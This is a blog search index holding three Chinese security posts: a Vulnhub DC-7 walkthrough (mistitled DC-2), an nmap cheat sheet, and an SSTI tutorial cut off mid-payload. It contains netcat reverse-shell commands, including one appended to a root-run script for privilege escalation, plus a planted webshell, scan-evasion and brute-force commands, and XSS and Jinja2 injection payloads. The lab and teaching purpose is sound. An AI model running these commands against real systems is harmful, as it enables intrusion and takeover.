<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>DC-2靶机渗透</title>
    <link href="/2023/05/31/DC-7%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    <url>/2023/05/31/DC-7%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-7靶机渗透"><a href="#DC-7靶机渗透" class="headerlink" title="DC-7靶机渗透"></a>DC-7靶机渗透</h1><h2 id="1-信息搜集"><a href="#1-信息搜集" class="headerlink" title="1.信息搜集"></a>1.信息搜集</h2><p>用nmap对C段进行扫描，命令：nmap -sV  192.168.0.1&#x2F;24</p><p>扫描到dc-7目标靶机ip为192.168.0.106且开放80和22端口</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305310927657.png" alt="image-20230531091934423"></p><p>访问目标80端口,利用插件查看目标为Drupal8框架，主页面提示爆破不会成功，需要做的就是“跳出”框框思考。搜索DC7USER发现是git源码泄露。<img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305310941138.png"></p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305310928195.png" alt="image-20230531092251586"></p><p>在配置文件中找到了用户名和密码</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$用</span>户名= <span class="hljs-string">&quot; dc7user &quot;</span>;<br><span class="hljs-variable">$密</span>码=“ <span class="hljs-title class_">MdR3xOgB7</span><span class="hljs-comment">#dW ”；</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305310958489.png" alt="image-20230531095822425"></p><p>直接拿密码登录，发现密码错误</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311001338.png" alt="image-20230531100138277"></p><h2 id="2-ssh口令利用"><a href="#2-ssh口令利用" class="headerlink" title="2.ssh口令利用"></a>2.ssh口令利用</h2><p>尝试利用ssh登录，可以成功登录。</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311003333.png" alt="image-20230531100301289"></p><p>首先whoami，并查看当前目录下的文件，发现存在backups，mbox，进入backups发现存在website.sql.gpg  website.tar.gz.gpg这样的文件，百度了解到gpg格式的是加密文件 ，且加密后文件内容都是乱码。这应该对我们就是没什么用的了，那就先查看mbox文件的内容</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311008960.png" alt="image-20230531100853921"></p><p>mbox</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311011091.png" alt="image-20230531101112045"></p><h2 id="3-drush创建用户"><a href="#3-drush创建用户" class="headerlink" title="3.drush创建用户"></a>3.drush创建用户</h2><p>发现backups.sh是root执行的脚本，且发现里面执行了drush命令。</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311025907.png" alt="image-20230531102551869"></p><p>drush是一个shell接口，用于从云服务器命令行管理Drupal。</p><p>需要在 drupal web目录执行（&#x2F;var&#x2F;www&#x2F;[drupal_folder_name]）</p><p>使用 drup 更改密码运行命令（drush user-password admin –password&#x3D;”new_pass”）</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">drush <span class="hljs-keyword">user</span>-<span class="hljs-keyword">password</span> <span class="hljs-keyword">admin</span> <span class="hljs-comment">--password=&quot;123456&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311031226.png" alt="image-20230531103106180"></p><h2 id="4-写马"><a href="#4-写马" class="headerlink" title="4.写马"></a>4.写马</h2><p>登录后台，在Content—&gt;Add content–&gt;Basic page下可以添加页面，但是发现不支持php,需要安装插件，将php模块（<a href="https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz%EF%BC%89%E5%AF%BC%E5%85%A5%EF%BC%88%E5%AF%BC%E5%85%A5%E8%B7%AF%E5%BE%84extend%E2%80%94%3E+Install">https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz）导入（导入路径extend—&gt;+Install</a> new module），导入成功后在extend中添加模块。<img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311031676.png" alt="image-20230531103129601"></p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311034968.png" alt="image-20230531103411894"></p><p>安装php扩展</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311037898.png" alt="image-20230531103715823"></p><p>写入一句话木马，用蚁剑连接</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311049432.png" alt="image-20230531104952362"></p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311055473.png" alt="image-20230531105559423"></p><h2 id="5-反弹shell"><a href="#5-反弹shell" class="headerlink" title="5.反弹shell"></a>5.反弹shell</h2><p>在&#x2F;opt&#x2F;scripts目录下的backups.sh脚本文件所属组是www-data，所以www-data用户可以对这个脚本文件进行操作，并且这个脚本文件定时执行可以利用它来反弹shell </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">6666</span>  （kali中执行）<br><span class="hljs-attribute">nc</span> -e /bin/bash <span class="hljs-number">192.168.0.105</span> <span class="hljs-number">6666</span> （蚁剑终端执行）<br><span class="hljs-attribute">python</span> -c &#x27;import pty;pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#x27; （进入交互式界面）<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305311058168.png" alt="image-20230531105842119"></p><h2 id="6-root提权"><a href="#6-root提权" class="headerlink" title="6.root提权"></a>6.root提权</h2><p>提权，写入反弹shell到backups.sh中，拿到root权限</p><p>写入反弹shell代码到backups.sh脚本文件，并在kali监听7777端口，稍等片刻后，成功getshell。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cobol">echo nc -e 192.168.0.105 6666 /bin/bash &gt;&gt; backups.sh<br>nc -lvp 6666（kali）<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NMap使用技巧总结</title>
    <link href="/2023/05/30/NMap%20%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/"/>
    <url>/2023/05/30/NMap%20%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="NMap-使用技巧总结"><a href="#NMap-使用技巧总结" class="headerlink" title="NMap 使用技巧总结"></a><strong>NMap</strong> <strong>使用技巧总结</strong></h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a><strong>一、主机发现</strong></h2><ol><li>全面扫描&#x2F;综合扫描</li></ol><p>nmap -A 192.168.1.103</p><ol start="2"><li>Ping 扫描</li></ol><p>nmap -sP 192.168.1.1&#x2F;24</p><ol start="3"><li>免 Ping 扫描，穿透防火墙，避免被防火墙发现</li></ol><p>nmap -P0 192.168.1.103</p><ol start="4"><li>TCP SYN Ping 扫描</li></ol><p>nmap -PS -v 192.168.1.103</p><p>nmap -PS80,10-100 -v 192.168.1.103 （针对防火墙丢弃 RST 包）</p><ol start="5"><li>TCP ACK Ping 扫描</li></ol><p>nmap -PA -v 192.168.1.103</p><ol start="6"><li>UDP Ping 扫描</li></ol><p>nmap -PU -v 192.168.1.103</p><ol start="7"><li>ICMP Ping Types 扫描</li></ol><p>nmap -PU -v 192.168.1.103 (ICMP ECHO)</p><p>nmap -PP -v 192.168.1.103 (ICMP 时间戳)</p><p>nmap -PM -v 192.168.1.103 (ICMP 地址掩码)</p><ol start="8"><li>ARP Ping 扫描</li></ol><p>nmap -PR -v 192.168.1.103</p><ol start="9"><li>列表 扫描</li></ol><p>nmap -sL -v 192.168.1.103</p><ol start="10"><li>禁止方向域名解析</li></ol><p>nmap -n -sL -v 192.168.1.103</p><ol start="11"><li>方向域名解析</li></ol><p>nmap -R -sL -v 192.168.1.103</p><ol start="12"><li>使用系统域名解析系统</li></ol><p>nmap –system-dns 192.168.1.2 192.168.1.103</p><ol start="13"><li>扫描 IPV6 地址</li></ol><p>nmap -6 IPv6</p><ol start="14"><li>路由跟踪</li></ol><p>nmap –traceroute -v <a href="http://www.sunbridgegroup.com/">www.sunbridgegroup.com</a></p><ol start="15"><li>SCTP INIT Ping 扫描</li></ol><p>nmap -PY -v 192.168.1.103</p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a><strong>二、端口扫描</strong></h2><ol><li>时序扫描</li></ol><p>nmap -T(0-5) 192.168.1.103</p><ol start="2"><li>常用扫描方式</li></ol><p>nmap -p 80 192.168.1.103</p><p>nmap -p 80-100 192.168.1.103</p><p>nmap -p T:80,U:445 192.168.1.103</p><p>nmap -F 192.168.1.1.103 (快速扫描)</p><p>nmap –top-ports 100 192.168.1.103 (扫描最有用的前 100 个端口)</p><ol start="3"><li>TCP SYN 扫描 （高效的扫描方式）</li></ol><p>nmap -sS -v 192.168.1.103</p><ol start="4"><li>TCP 连接扫描</li></ol><p>nmap -sT -v 192.168.1.103</p><ol start="5"><li>UDP 连接扫描</li></ol><p>nmap -sU -p 80-100 192.168.1.103</p><ol start="6"><li>隐蔽扫描</li></ol><p>nmap -sN 61.241.194.153(NULL 扫描)</p><p>nmap -sF 61.241.194.153(FIN 扫描)</p><p>nmap -sX 61.241.194.153(Xmas 扫描)</p><ol start="7"><li>TCP ACK 扫描</li></ol><p>nmap -sA 192.168.1.103</p><ol start="8"><li>TCP 窗口扫描</li></ol><p>nmap -sW -v -F 192.168.1.103</p><ol start="9"><li>TCP Maimon 扫描</li></ol><p>nmap -sM -T4 192.168.1.103</p><ol start="10"><li>自定义 扫描</li></ol><p>nmap -sT –scanflags SYNURG 192.168.1.10311. 空闲 扫描( 隐藏 IP )</p><p>nmap -sI <a href="http://www.0day.co/">www.0day.co:80</a> 192.168.1.103</p><ol start="12"><li>IP 协议 扫描</li></ol><p>nmap -sO -T4 192.168.1.103</p><h2 id="三、指纹识别与探测"><a href="#三、指纹识别与探测" class="headerlink" title="三、指纹识别与探测"></a><strong>三、指纹识别与探测</strong></h2><ol><li>版本探测</li></ol><p>nmap -sV 192.168.1.103</p><p>nmap -sV -A 192.168.1.103</p><ol start="2"><li>全端口版本探测</li></ol><p>nmap -sV –allports 192.168.1.103</p><ol start="3"><li>设置扫描强度</li></ol><p>nmap -sV –version-intensity (0-9) 192.168.1.103</p><ol start="4"><li>轻量级扫描</li></ol><p>nmap -sV –version-light 2 192.168.1.103</p><ol start="5"><li>重量级扫描</li></ol><p>nmap -sV –version-all 192.168.1.103</p><ol start="6"><li>获取详细版本信息</li></ol><p>nmap -sV –version-trace 192.168.1.103</p><ol start="7"><li>RPC 扫描</li></ol><p>nmap -sS -sR 192.168.1.103</p><ol start="8"><li>对指定的目标进行操作系统监测</li></ol><p>nmap -O –osscan-limit 192.168.1.103</p><ol start="9"><li>推测系统并识别</li></ol><p>nmap -O –osscan-guess 192.168.1.103</p><h2 id="四、伺机而动"><a href="#四、伺机而动" class="headerlink" title="四、伺机而动"></a><strong>四、伺机而动</strong></h2><ol><li>调整并行扫描组的大小</li></ol><p>nmap –min-hostgroup 30 192.168.1.110&#x2F;24</p><p>nmap –max-hostgroup 30 902 192.168.1.104</p><ol start="2"><li>调整探测报文的并行度</li></ol><p>nmap –min-parallelism 100 192.168.1.104</p><p>nmap –max-parallelism 100 192.168.1.104</p><ol start="3"><li>调整探测报文超时</li></ol><p>nmap –initial-rtt-timeout 100ms 192.168.1.104</p><p>nmap –max-rtt-timeout 100ms 192.168.1.104</p><p>nmap –min-rtt-timeout 100ms 192.168.1.104</p><ol start="4"><li>放弃缓慢的目标主机</li></ol><p>nmap –host-timeout 1800000ms 192.168.1.104</p><ol start="5"><li>调整报文适合时间间隔</li></ol><p>nmap –scan-delay 1s 192.168.1.104</p><p>nmap –max-scan-delay 1s 192.168.1.104</p><h2 id="五、防火墙-x2F-IDS-逃逸"><a href="#五、防火墙-x2F-IDS-逃逸" class="headerlink" title="五、防火墙&#x2F;IDS 逃逸"></a><strong>五、防火墙</strong><strong>&#x2F;IDS</strong> <strong>逃逸</strong></h2><ol><li>报文分段</li></ol><p>nmap -f -v 61.241.194.153</p><ol start="2"><li>指定偏移大小</li></ol><p>nmap –mtu 16 192.168.1.104</p><ol start="3"><li>IP 欺骗</li></ol><p>nmap -D RND:11 192.168.1.104</p><p>nmap -D 192.168.1.104,192.168.1.103,192.168.1.101 192.168.1.104</p><ol start="4"><li>源地址欺骗</li></ol><p>nmap -sI <a href="http://www.0day.cn/">www.0day.cn:80</a> 192.168.1.104</p><ol start="5"><li>源端口欺骗</li></ol><p>nmap –source-port 902 192.168.1.104</p><ol start="6"><li>指定发包长度</li></ol><p>nmap –data-length 30 192.168.1.104</p><ol start="7"><li>目标主机随机排序</li></ol><p>nmap –randomize-hosts 192.168.1.104</p><ol start="8"><li>MAX 地址欺骗</li></ol><p>nmap -sT -Pn –spoof-mac 0 192.168.1.104</p><h2 id="六、信息收集"><a href="#六、信息收集" class="headerlink" title="六、信息收集"></a><strong>六、信息收集</strong></h2><ol><li>IP 信息收集</li></ol><p>nmap –script ip-geolocation-* <a href="http://www.pcos.cn/">www.pcos.cn</a></p><ol start="2"><li>WHOIS 查询</li></ol><p>nmap –script whois-domain <a href="http://www.pcos.cn/">www.pcos.cn</a></p><p>nmap –script whois-domain –script-args whois.whodb&#x3D;nofollow</p><p><a href="http://www.ithome.com/">www.ithome.com</a></p><p>nmap -sn –script whois-domain -v -iL host.txt</p><ol start="3"><li>搜索邮件信息(新版可能没有这个模块)</li></ol><p>nmap –script http-email-harvest <a href="http://www.pcos.cn/">www.pcos.cn</a></p><ol start="4"><li>IP 反查</li></ol><p>nmap -sn –script hostmap-ip2hosts <a href="http://www.pcos.cn/">www.pcos.cn</a></p><ol start="5"><li>DNS 信息收集</li></ol><p>nmap –script dns-brute <a href="http://www.pcos.cn/">www.pcos.cn</a></p><p>nmap –script dns-brute dns-brute.threads&#x3D;10 <a href="http://www.pcos.cn/">www.pcos.cn</a></p><p>nmap </p><p>–script </p><p>dns-brute </p><p>dns-brute.threads&#x3D;10,dns-brute.hostlis<a href="http://www.pcos.cn/">www.pcos.cn</a></p><ol start="6"><li>检索系统信息</li></ol><p>nmap -p 445 445 192.168.1.104 –script membase-http-info</p><ol start="7"><li>后台打印机服务漏洞</li></ol><p>nmap –script smb-security-mode.nse -p 445 119.29.155.45</p><ol start="8"><li>系统漏洞扫描</li></ol><p>nmap –script smb-check-vulns.nse -p 445 119.29.155.45</p><p>  9.扫描 Web 漏洞</p><p>nmap -p80 –script http-stored-xss.nse&#x2F;http-sql-injection.nse 119.29.155.45</p><ol start="10"><li>通过 Snmp 列举 Windows 服务&#x2F;账户</li></ol><p>nmap -sU -p 161 –script&#x3D;snmp-win32-services 192.168.1.104</p><p>nmap -sU -f -p 161 –script&#x3D;snmp-win32-users 192.168.1.110</p><ol start="11"><li>枚举 DNS 服务器的主机名</li></ol><p>nmap –script dns-brute –script-args dns-brute.domain&#x3D;baidu.com</p><ol start="12"><li>HTTP 信息收集</li></ol><p>nmap -sV -p 80 <a href="http://www.0day.com/">www.0day.com</a> (HTTP 版本探测)</p><p>nmap -p 80 –script&#x3D;http-headers <a href="http://www.pcos.cn/">www.pcos.cn</a> (HTTP 信息头探测)</p><p>nmap -p 80 –script&#x3D;http-sitemap-generator <a href="http://www.pcos.cn/">www.pcos.cn</a> (爬行 Web 目</p><p>录结构)</p><ol start="13"><li>枚举 SSL 密钥</li></ol><p>nmap -p 443 –script&#x3D;ssl-enum-ciphers <a href="http://www.baidu.com/">www.baidu.com</a></p><ol start="14"><li>SSH 服务密钥信息探测</li></ol><p>map -p 22 –script ssh-hostkey –script-args ssh_hostkey&#x3D;full 127.0.0.1</p><h2 id="七、数据库渗透测试"><a href="#七、数据库渗透测试" class="headerlink" title="七、数据库渗透测试"></a><strong>七、数据库渗透测试</strong></h2><ol><li>Mysql 列举数据库</li></ol><p>nmap </p><p>-p3306 </p><p>–script&#x3D;mysql-databases </p><p>–script-args</p><p>mysqluser&#x3D;root,mysqlpass 192.168.1.101</p><ol start="2"><li>列举 MySQL 变量</li></ol><p>nmap -p3306 –script&#x3D;mysql-variables 192.168.1.3</p><p>nmap -sV –script&#x3D;mysql-variables 192.168.1.3 (无法确定端口的情况下)</p><ol start="3"><li>检查 MySQL 密码</li></ol><p>nmap -p3306 –script&#x3D;mysql-empty-password 192.168.1.3</p><p>nmap -sV -F -T4 –script&#x3D;mysql-empty-password 192.168.1.3</p><ol start="4"><li>审计 MySQL 密码</li></ol><p>nmap –script&#x3D;mysql-brute 192.168.1.101</p><p>nmap -p3306 –script&#x3D;mysql-brute userdb&#x3D;&#x2F;root&#x2F;passdb.txt passdb&#x3D;&#x2F;root&#x2F;pass.txt 192.168.1.101 (指定字典)</p><ol start="5"><li>审计 MySQL 安全配置</li></ol><p>nmap -p3306 –script mysql-audit –script-args “mysql-audit.username&#x3D;’root’,mysql-audit.password&#x3D;’123’,mysql-audit.filename&#x3D;’nselib&#x2F;data&#x2F;mysql-cis.audit’” 192.168.1.104</p><ol start="6"><li>审计 Oracle 密码</li></ol><p>nmap –script&#x3D;oracle-brute -p 1521 –script-args oracle-brute.sid&#x3D;test</p><p>192.168.1.121</p><p>nmap –script&#x3D;oracle-brute -p 1521 –script-args oracle-brute.sid&#x3D;test</p><p>–script-args userdb&#x3D;&#x2F;tmp&#x2F;usernames.txt,passdb&#x3D;&#x2F;tmp&#x2F;password.txt 192.168.1.105</p><ol start="7"><li>审计 msSQL密码</li></ol><p>nmap  -p 1433 –script ms-sql-brute –script-args userdb&#x3D;name.txt,passdb&#x3D;pass.txt 192.168.1.104</p><ol start="8"><li>检查 msSQL 空密码</li></ol><p>nmap -p 1433 –script ms-sql-empty-password 192.168.1.104</p><ol start="9"><li>读取 msSQL 数据</li></ol><p>nmap -p 1433 –script ms-sql-tables –script-args</p><p>mssql.username&#x3D;sa,mssql.Password&#x3D;sa 192.168.1.101</p><ol start="10"><li>读取 msSQL 执行系统命令</li></ol><p>nmap -p 1433 –script ms-sql-xp-cmdshell –script-args</p><p>mssql.username&#x3D;sa,mssql.password&#x3D;sa,ms-sql-xp-cmdshell.cmd&#x3D;”ipconfig” 192.168.1.101</p><ol start="11"><li>审计 PgSQL 密码</li></ol><p>nmap -p 5432 –script pgsql-brute 192.168.1.101</p><h2 id="八、渗透测试"><a href="#八、渗透测试" class="headerlink" title="八、渗透测试"></a><strong>八、渗透测试</strong></h2><ol><li>审计 HTTP 身份验证</li></ol><p>nmap –script&#x3D;http-brute -p 80 <a href="http://www.pcos.cn/">www.pcos.cn</a></p><ol start="2"><li>审计 FTP 服务器</li></ol><p>nmap –script ftp-brute -p 21 192.168.1.101</p><p>nmap –script ftp-brute –script-args userdb&#x3D;user.txt,passdb&#x3D;pass.txt -p 21 192.168.1.101</p><p>nmap –script&#x3D;ftp-anon 192.168.1.101</p><ol start="3"><li>审计 Wordpress 程序</li></ol><p>nmap -p80 –script http-wordpress-brute 192.168.1.110</p><p>nmap -p80 –script http-wordpress-brute –script-args</p><p>userdb&#x3D;user.txt,passdb&#x3D;passwd.txt 192.168.1.110</p><p>nmap -p80 –script http-wordpress-brute –script-args</p><p>http-wordpress-brute.threads&#x3D;10 192.168.1.110</p><ol start="4"><li>审计 Joomla 程序</li></ol><p>nmap -p80 –script http-joomla-brute 192.168.1.110</p><p>nmap -p80 –script http-joomla-brute –script-args</p><p>uesrdb&#x3D;user.txt,passdb&#x3D;passwd.txt 192.168.1.110</p><p>nmap -p80 –script http-joomla-brute –script-args uesrdb&#x3D;user.txt,passdb&#x3D;passwd.txt,http-joomla-brute.threads&#x3D;5</p><p>192.168.1.110</p><ol start="5"><li>审计 邮件服务器</li></ol><p>nmap -p110 –script&#x3D;pop3-brute 192.168.1.110</p><ol start="6"><li>审计 SMB 口令</li></ol><p>nmap –script smb-brute.nse -p 445 192.168.1.110</p><p>nmap –script smb-brute.nse –script-args passdb&#x3D;pass.txt -p 445</p><p>192.168.1.110</p><ol start="7"><li>审计 VNC 服务</li></ol><p>nmap –script vnc-brute -p 5900 192.168.1.110</p><ol start="8"><li>审计 SMTP 服务器</li></ol><p>nmap -p 25 –script smtp-brute 192.168.1.110</p><p>nmap -p 25 –script&#x3D;smtp-enum-users.nse smith.jack.com (枚举远程系</p><p>统所有用户)</p><ol start="9"><li>检测 Stuxnet 蠕虫</li></ol><p>nmap –script stuxnet-detect -p 445 192.168.1.110</p><ol start="10"><li>SNMP 服务安全审计</li></ol><p>nmap -sU -p 161 –script&#x3D;snmp-netstat 192.168.1.101 (获取目标主机网</p><p>络连接状态)nmap -sU -p 161 –script&#x3D;snmp-processes 192.168.1.110 (枚举目标主机</p><p>的系统进程)</p><p>nmap -sU -p 161 –script&#x3D;snmp-win32-services 192.168.1.110 ( 获 得</p><p>windows 服务器的服务)</p><p>nmap -sU -p 161 –script snmp-brute 192.168.1.110</p><h2 id="九、-Zenmap"><a href="#九、-Zenmap" class="headerlink" title="九、****Zenmap"></a><strong>九、****Zenmap</strong></h2><ol><li>Intense scan (详细扫描)</li></ol><p>nmap -T4 -A -v 192.168.1.101</p><ol start="2"><li>Intense scan plus UDP (UDP 扫描经典使用)</li></ol><p>nmap -sS -sU -T4 -A -v 192.168.1.101</p><ol start="3"><li>Intense scan, all TCP ports (TCP 扫描)</li></ol><p>nmap -p 1-65535 -T4 -A -v 192.168.1.101</p><ol start="4"><li>Intense scan, no ping (无 Ping 扫描)</li></ol><p>nmap -T4 -A -v -Pn 192.168.1.101</p><ol start="5"><li>Ping scan (Ping 扫描)</li></ol><p>nmap -sn 192.168.1.101&#x2F;24</p><ol start="6"><li>Quick scan</li></ol><p>nmap -T4 -F 192.168.1.101&#x2F;24</p><ol start="7"><li>Quick scan plus</li></ol><p>nmap -sV -T4 -O -F –version-light 192.168.1.101&#x2F;24</p><ol start="8"><li>Quick traceroute</li></ol><p>nmap -sn –traceroute 192.168.1.101</p><ol start="9"><li>Regular scan</li></ol><p>nmap 192.168.1.101</p><ol start="10"><li>Slow comprehensive scan</li></ol><p>nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53</p><p>–script “default or (discovery and safe)” 192.168.1.101</p><h2 id="十-Nmap-技巧"><a href="#十-Nmap-技巧" class="headerlink" title="十. Nmap 技巧"></a><strong>十</strong><strong>. Nmap</strong> <strong>技巧</strong></h2><p>\1. 发送以太网数据包</p><p>nmap –send-eth 192.168.1.111</p><ol start="2"><li>网络层发送</li></ol><p>nmap –send-ip 192.168.1.111</p><ol start="3"><li>假定拥有所有权</li></ol><p>nmap –privileged 192.168.1.111</p><ol start="4"><li>在交互模式中启动</li></ol><p>nmap –interactive</p><ol start="5"><li>查看 Nmap 版本号</li></ol><p>nmap -V</p><ol start="6"><li>设置调试级别</li></ol><p>nmap -d (1-9) 192.168.1.111</p><ol start="7"><li>跟踪发送接收的报文</li></ol><p>nmap –packet-trace -p 20-30 192.168.1.111</p><ol start="8"><li>列举接口和路由</li></ol><p>nmap –iflist <a href="http://www.iteye.com/">www.iteye.com</a></p><ol start="9"><li><p>指定网络接口nmap -e eth0 192.168.1.111</p></li><li><p>继续中断扫描</p></li></ol><p>nmap -oG 1.txt -v 192.168.126.1&#x2F;24</p><p>nmap –resume 1.txt (继续扫描)</p><ol start="11"><li>Dnmap</li></ol><p>dnmap_server -f test (指定命令脚本)</p><p>dnmap_client -s 192.168.1.107 -a test</p><ol start="12"><li>编写 Nse 脚本</li></ol><p>(1) – The scanning module – </p><p>author &#x3D; “Wing” </p><p>categories &#x3D; {“version”}</p><p>portrule &#x3D; function(host,port)</p><p>return port.protocol &#x3D;&#x3D; “tcp” and port.number &#x3D;&#x3D; 80 and</p><p>port.state &#x3D;&#x3D; “open” </p><p>end</p><p>action &#x3D; function(host,port)return “Found!!!” </p><p>end</p><p>(2) – The scanning module – </p><p>author &#x3D; “Wing” </p><p>categories &#x3D; {“version”}</p><p>local comm&#x3D;require “comm”</p><p>require “shortport”</p><p>local http&#x3D;require “http” </p><p>portrule &#x3D; function(host,port)</p><p>return (port.number &#x3D;&#x3D; 80) and (port.start&#x3D;&#x3D;”open”)</p><p>end</p><p>action &#x3D; function(host,port)</p><p>local uri &#x3D; “&#x2F;admin.php”</p><p>local response &#x3D; http.get(host,port,uri)</p><p>return “Found!!!” </p><p>end</p><ol start="13"><li><p>探测防火墙nmap –script&#x3D;firewalk –traceroute 192.168.1.111</p></li><li><p>VMware 认证破解</p></li></ol><p>nmap -p 902 –script vmauthd-brute 192.168.1.107</p><h2 id="十一-Nmap-的保存和输出"><a href="#十一-Nmap-的保存和输出" class="headerlink" title="十一. Nmap 的保存和输出"></a><strong>十一</strong><strong>. Nmap</strong> <strong>的保存和输出</strong></h2><ol><li>标准保存</li></ol><p>nmap -F -oN d:&#x2F;test1.txt 192.168.1.111</p><ol start="2"><li>XML 保存</li></ol><p>nmap -F -oX d:&#x2F;test1.xml 192.168.1.111</p><ol start="3"><li>133t 保存</li></ol><p>nmap -F -oS d:&#x2F;test2.txt 192.168.1.111</p><ol start="4"><li>Grep 保存</li></ol><p>nmap -F -oG d:&#x2F;test2.txt 192.168.1.111</p><ol start="5"><li>保存到所有格式</li></ol><p>nmap -F -oA d:&#x2F;test2 192.168.1.1116. 补充保存文件</p><p>nmap -F -append-output -oN d:&#x2F;test2.txt 192.168.1.111</p><ol start="7"><li>转换 XML 保存</li></ol><p>nmap -F -oX testB.xml –stylesheet  <a href="http://www.insecure.org/nmap/data/nmap.xsl">http://www.insecure.org/nmap/data/nmap.xsl</a> 192.168.1.111</p><ol start="8"><li>忽略 XML 声明的 XSL 样式表</li></ol><p>nmap -oX d:&#x2F;testC.xml –no-stylesheet 192.168.1.111</p>]]></content>
    
    
    <categories>
      
      <category>工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI模板注入</title>
    <link href="/2023/04/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/04/13/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h1><p>SSTI就是服务器端模板注入，SSTI是注入类的漏洞，</p><p>注入漏洞的根本原因，是当攻击者向应用程序发送恶意数据的时候，应用程序并未进行校验，直接传递给到解释器，解释器是不会对攻击者输入的恶意数据进行校验，而是直接翻译成机器可以执行的语句，</p><p>SSTI是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。与sql注入不同的是SSTI利用的是现在的网站模板引擎，主要针对python、php、java的一些网站处理框架，比如Python的jinja2 mako tornado django，php的smarty twig，java的jade  velocity。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180908041.png" alt="1668402095241-a8b00449-110b-40a3-98a6-952882c708d7"></p><p>首先要测试出来是什么模板</p><h2 id="polarctf-ssti"><a href="#polarctf-ssti" class="headerlink" title="polarctf ssti"></a>polarctf ssti</h2><p>以polarctf上的ssti为例</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180913698.png" alt="image-20230418091303650"></p><p>get传参name</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180913607.png" alt="image-20230418091332557"></p><p>使name&#x3D;6，顺手测试了一下XSS， </p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180934156.png" alt="image-20230418093456114"></p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-built_in">?name</span>=<span class="hljs-number">1</span>&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180952744.png" alt="image-20230418095202694"></p><p>返回6，在进行进一步测试6</p><p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202304180935337.png" alt="image-20230418093554293"></p><p>返回222，由此可判定是jinja2模板,payload为</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">#命令执行：</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span 